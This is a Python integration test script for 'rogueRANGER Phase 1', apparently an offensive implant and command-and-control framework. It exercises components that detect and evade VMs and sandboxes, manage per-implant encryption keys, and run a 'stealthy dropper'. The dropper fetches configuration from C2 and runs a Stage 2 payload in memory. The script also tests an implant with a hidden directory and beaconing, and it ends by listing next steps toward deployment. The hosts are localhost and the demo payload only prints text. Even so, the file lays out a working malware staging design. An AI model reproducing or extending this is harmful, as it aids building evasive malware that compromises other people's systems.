#!/usr/bin/env python3
"""
Test script for rogueRANGER Phase 1 integration
Demonstrates the stealthy stager workflow
"""

import os
import sys
import json
import time
import subprocess
import tempfile
from pathlib import Path

def test_vm_detection():
    """Test VM/sandbox detection"""
    print("=== Testing VM Detection ===")
    
    from vm_detector import VMSandboxDetector
    
    detector = VMSandboxDetector()
    results = detector.run_full_detection()
    
    print(f"Confidence score: {results['confidence_score']:.1f}")
    print(f"VM indicators: {len(results['vm_indicators'])}")
    print(f"Sandbox indicators: {len(results['sandbox_indicators'])}")
    print(f"Debugger indicators: {len(results['debugger_indicators'])}")
    
    if detector.is_sandboxed():
        print("Result: LIKELY IN SANDBOX/VM")
    else:
        print("Result: LIKELY BARE METAL")
    
    return results

def test_key_management():
    """Test key management system"""
    print("\n=== Testing Key Management ===")
    
    from key_manager import KeyManager
    
    # Create key manager
    km = KeyManager("test_implant_001")
    
    # Test encryption/decryption
    test_message = "rogueRANGER Phase 1 test message"
    
    # Symmetric encryption
    encrypted = km.encrypt_data(test_message)
    decrypted = km.decrypt_data(encrypted)
    
    print(f"Original: {test_message}")
    print(f"Encrypted: {encrypted[:50]}...")
    print(f"Decrypted: {decrypted}")
    
    assert decrypted == test_message, "Encryption/decryption failed"
    print("✓ Symmetric encryption test passed")
    
    # RSA encryption
    rsa_encrypted = km.rsa_encrypt(test_message)
    rsa_decrypted = km.rsa_decrypt(rsa_encrypted)
    
    assert rsa_decrypted == test_message, "RSA encryption failed"
    print("✓ RSA encryption test passed")
    
    # Key rotation
    old_key = km.get_key('master_symmetric')
    km.rotate_key('master_symmetric')
    new_key = km.get_key('master_symmetric')
    
    assert old_key != new_key, "Key rotation failed"
    print("✓ Key rotation test passed")
    
    return km

def test_dropper_logic():
    """Test dropper logic (without actual network calls)"""
    print("\n=== Testing Dropper Logic ===")
    
    # Create a mock config
    mock_config = {
        'c2_sources': ['http://localhost:5000/config/test_implant'],
        'sleep_on_detection': 5,
        'max_retries': 1,
        'timeout': 2
    }
    
    # Test system fingerprint
    from dropper import StealthyDropper
    
    # Create dropper with mock config
    class MockDropper(StealthyDropper):
        def load_config(self):
            return mock_config
        
        def retrieve_c2_config(self):
            # Return mock config
            return {
                'stage2_url': 'http://localhost:8000/test_stage2.py',
                'encryption_key': b'test_key_123456789012345678901234567890',
                'implant_id': 'test_implant_001'
            }
    
    dropper = MockDropper()
    
    # Test system fingerprint
    fingerprint = dropper.get_system_fingerprint()
    print(f"System fingerprint: {hashlib.md5(fingerprint).hexdigest()[:16]}")
    
    # Test key derivation
    key = dropper.derive_key(fingerprint)
    print(f"Derived key: {key[:20]}...")
    
    print("✓ Dropper logic tests passed")
    return dropper

def test_enhanced_implant():
    """Test enhanced implant functionality"""
    print("\n=== Testing Enhanced Implant ===")
    
    # Create test config
    test_config = {
        'implant_id': 'test_implant_001',
        'c2_host': 'localhost',
        'c2_port': 5000,
        'beacon_interval': 2,
        'use_legacy_encryption': False
    }
    
    # We'll test the implant class directly
    from rogue_implant_enhanced import EnhancedImplant
    
    # Create implant with test config
    implant = EnhancedImplant(test_config)
    
    print(f"Implant ID: {implant.implant_id}")
    print(f"Hidden dir: {implant.hidden_dir}")
    print(f"Key manager initialized: {implant.key_manager is not None}")
    print(f"VM detector initialized: {implant.vm_detector is not None}")
    
    # Test environment detection
    cloud_info = implant.cloud_implant.detect_environment()
    print(f"Cloud detection: {cloud_info}")
    
    print("✓ Enhanced implant initialization passed")
    return implant

def test_integration_workflow():
    """Test the complete Phase 1 workflow"""
    print("\n=== Testing Complete Workflow ===")
    
    print("1. Dropper executes with VM detection")
    print("2. Retrieves encrypted config from C2")
    print("3. Downloads and executes Stage 2 in memory")
    print("4. Stage 2 implant initializes with KeyManager")
    print("5. Implant registers with C2 using public key")
    print("6. Secure beaconing and command execution")
    
    # Create a simple demonstration
    workflow = {
        'phase': 'Phase 1: Stealthy Stager',
        'components': [
            'vm_detector.py - VM/sandbox detection',
            'dropper.py - Stage 1 stealth dropper',
            'key_manager.py - Per-implant key management',
            'rogue_implant_enhanced.py - Enhanced implant',
            'config_server.py - Configuration server'
        ],
        'features': [
            'Per-implant unique encryption keys',
            'VM/sandbox detection and evasion',
            'Encrypted C2 configuration retrieval',
            'Memory-only Stage 2 execution',
            'Automatic key rotation',
            'Secure beaconing with RSA encryption'
        ]
    }
    
    print(f"\nWorkflow: {workflow['phase']}")
    print("\nComponents:")
    for component in workflow['components']:
        print(f"  • {component}")
    
    print("\nFeatures:")
    for feature in workflow['features']:
        print(f"  • {feature}")
    
    return workflow

def create_demo_files():
    """Create demo files for testing"""
    print("\n=== Creating Demo Files ===")
    
    demo_dir = Path("demo_phase1")
    demo_dir.mkdir(exist_ok=True)
    
    # Create a simple stage2 payload for testing
    stage2_content = '''#!/usr/bin/env python3
print("=== Stage 2 Implant ===")
print("This would be the actual implant payload")
print("Loaded and executed in memory by dropper")
'''
    
    (demo_dir / "stage2_demo.py").write_text(stage2_content)
    
    # Create a simple config for dropper
    config_content = '''{
    "stage2_url": "http://localhost:8000/stage2_demo.py",
    "encryption_key": "test_key_for_demo_only",
    "implant_id": "demo_implant_001"
}'''
    
    (demo_dir / "demo_config.json").write_text(config_content)
    
    print(f"Demo files created in: {demo_dir}")
    print("  • stage2_demo.py - Example Stage 2 payload")
    print("  • demo_config.json - Example encrypted config")
    
    return demo_dir

def main():
    """Run all tests"""
    print("rogueRANGER Phase 1 Integration Tests")
    print("=====================================\n")
    
    try:
        # Run tests
        test_vm_detection()
        test_key_management()
        test_dropper_logic()
        test_enhanced_implant()
        test_integration_workflow()
        
        # Create demo files
        demo_dir = create_demo_files()
        
        print("\n" + "="*50)
        print("✅ ALL TESTS PASSED")
        print("="*50)
        
        print("\n=== NEXT STEPS ===")
        print("1. Start config server: python3 config_server.py")
        print("2. Test dropper: python3 dropper.py (with modified config)")
        print("3. Integrate KeyManager into main rogue_implant.py")
        print("4. Update rogue_c2.py for encrypted URL distribution")
        print("5. Deploy and test in controlled environment")
        
        print(f"\nDemo files available in: {demo_dir}")
        
    except Exception as e:
        print(f"\n❌ TEST FAILED: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0

if __name__ == "__main__":
    # Add current directory to path for imports
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
    
    # Import hashlib for fingerprint test
    import hashlib
    
    exit(main())